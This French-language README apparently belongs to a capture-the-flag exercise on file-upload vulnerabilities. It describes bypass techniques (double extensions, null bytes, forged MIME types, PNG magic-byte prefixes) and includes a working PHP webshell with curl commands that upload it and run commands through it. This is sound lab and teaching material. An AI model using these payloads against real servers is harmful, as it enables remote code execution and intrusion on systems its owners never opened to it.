# 0x05 - Upload Vulnerabilities (Vulnérabilités d'upload)

Ce dossier contient des fichiers liés aux exercices sur les vulnérabilités d'upload de fichiers. L'objectif principal : identifier et exploiter une fonctionnalité d'upload mal configurée afin de trouver un flag stocké ou exécutable sur le serveur.

## Objectifs

- Trouver le point d'upload (formulaire / API) sur l'application.
- Tester les restrictions (extensions, types MIME, taille, contenu) et tenter des contournements.
- Récupérer ou exécuter le fichier uploadé si le serveur le sert ou l'interprète (ex : PHP).
- Extraire le flag si présent dans la page résultante, dans le fichier uploadé ou à l'URL publique du fichier.

## Pré-requis

- Un navigateur et/ou proxy (Burp Suite ou mitmproxy) pour intercepter et modifier les requêtes.
- Outils en ligne de commande : `curl`, `wget`, `file`, `xxd`, `openssl`, `python3`.
- (Optionnel) un petit serveur HTTP local pour servir payloads si nécessaire.

## Méthodologie recommandée

1) Identifier le point d'upload

- Cherche un formulaire `<input type="file">`, un endpoint `/upload`, `/files`, `/images`, `/api/upload` ou des indications dans JS.
- Liste des pages à vérifier : pages de profil, création d'articles, éditeur WYSIWYG, endpoints API listés dans JS.

2) Tests basiques d'upload

- Tester l'upload d'un petit fichier texte :

```bash
curl -sS -F "file=@test.txt" http://target/upload -D -
```

- Vérifier la réponse : statut HTTP, emplacement retourné (Location / URL), en-têtes `Content-Type`, `Set-Cookie`.

3) Contournements courants

- Extension autorisée mais contenu mal contrôlé : uploader `shell.php` renommé `shell.php.jpg` ou `shell.php.txt` et tester si accessible/exécutable.
- Double extension : `shell.php.jpg` ou `shell.jpg.php`.
- Null byte (pour anciens serveurs) : `shell.php%00.jpg` (peu efficace sur les serveurs modernes).
- Changer le `Content-Type` du fichier (ex: `image/jpeg`) lors de l'upload :

```bash
curl -sS -F "file=@shell.php;type=image/jpeg" http://target/upload -D -
```

- Modifier l'extension côté client puis vérifier le MIME sur le serveur (outil `file` ou réponse HTTP si le serveur donne l'URL).

4) Signature magique / magic bytes

- Certains serveurs vérifient les magic bytes (en-tête du fichier). Pour contourner, préfixer un webshell avec des bytes d'image valides (ex: PNG header) et espérer que le serveur ne nettoie pas le contenu.

Exemple : préfixer un PHP avec un en-tête PNG :

```bash
printf '\x89PNG\r\n\x1a\n' > p.png
printf '<?php system($_GET["cmd"]); ?>' >> p.png
curl -sS -F "file=@p.png;type=image/png" http://target/upload -D -
```

5) Vérifier l'accès / exécution

- Si le serveur retourne une URL pour le fichier uploadé, ouvre cette URL et recherche le flag.
- Si l'upload permet l'exécution (ex : upload PHP vers dossier interprété), appelle la webshell :

```bash
curl -sS "http://target/uploads/shell.php?cmd=cat /path/to/flag.txt"
```

6) Contournements supplémentaires

- Encodage Base64 du fichier et upload si le endpoint accepte des données brutes.
- Tenter upload via XHR/JSON si l'interface web a une API différente.
- Vérifier les chemins publics/privés (ex : `uploads/`, `files/`, `user_data/`).

## Commandes pratiques

- Upload simple multipart/form-data :

```bash
curl -v -F "file=@exploit.php" http://target/upload
```

- Upload avec type forcé :

```bash
curl -v -F "file=@exploit.php;type=image/jpeg" http://target/upload
```

- Récupérer l'URL retournée et afficher les 200 premiers octets :

```bash
curl -sS http://target/uploads/returned_name -D - | sed -n '1,200p'
```

- Vérifier le type du fichier localement :

```bash
file uploaded_file
xxd -l 32 uploaded_file
```

## Que poster ici pour obtenir de l'aide rapide

- L'endpoint exact pour l'upload (URL), la requête HTTP (headers et body) que tu envoies et la réponse (status + en-têtes + body).
- L'URL du fichier uploadé si le serveur la retourne.
- Résultats des commandes `file` et `xxd` si tu télécharges le fichier de sortie.

## Sécurité et éthique

- N'effectue ces tests que sur la cible du challenge (autorisation explicite). Respecte toujours les règles de la plateforme.
